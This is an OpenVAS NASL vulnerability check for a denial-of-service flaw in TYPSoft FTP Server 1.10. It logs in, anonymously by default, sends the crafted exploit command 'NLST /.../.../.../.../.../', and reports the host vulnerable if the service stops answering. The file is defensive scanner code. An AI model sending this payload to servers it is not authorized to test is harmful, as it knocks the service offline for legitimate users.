###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_typsoft_ftp_server_mult_cmd_dos_vuln.nasl 11435 2018-09-17 13:44:25Z cfischer $
#
# TYPSoft FTP Server Multiple Commands Remote Denial of Service Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802605");
  script_version("$Revision: 11435 $");
  script_bugtraq_id(51891);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-17 15:44:25 +0200 (Mon, 17 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-02-08 12:12:12 +0530 (Wed, 08 Feb 2012)");
  script_name("TYPSoft FTP Server Multiple Commands Remote Denial of Service Vulnerabilities");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51891");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/73016");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18469");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/109508/typsoftcwnslt-dos.txt");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("secpod_ftp_anonymous.nasl");
  script_require_ports("Services/ftp", 21);
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to crash
the affected application, denying service to legitimate users.");
  script_tag(name:"affected", value:"TYPSoft FTP Server Version 1.10");
  script_tag(name:"insight", value:"Multiple flaws are caused by an error when processing FTP commands,
which can be exploited to crash the FTP service by sending specially crafted FTP
commands.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running TYPSoft FTP Server and is prone to multiple
denial of service vulnerabilities.");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("ftp_func.inc");

ftpPort = get_ftp_port(default:21);

banner = get_ftp_banner(port:ftpPort);
if(! banner || "TYPSoft FTP Server" >!< banner){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(! soc){
  exit(0);
}

user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

if(! user){
  user = "anonymous";
  pass = "user@";
}

login_details = ftp_log_in(socket:soc, user:user, pass:pass);
if(! login_details){
  exit(0);
}

exploit = "NLST /.../.../.../.../.../";

ftp_send_cmd(socket:soc, cmd:exploit);
ftp_close(socket:soc);

soc1 = open_sock_tcp(ftpPort);
if(! soc1)
{
  exit(0);
}

banner =  recv(socket:soc1, length:512);
if(! banner || "TYPSoft FTP Server" >!< banner)
{
  security_message(ftpPort);
  exit(0);
}
ftp_close(socket:soc1);
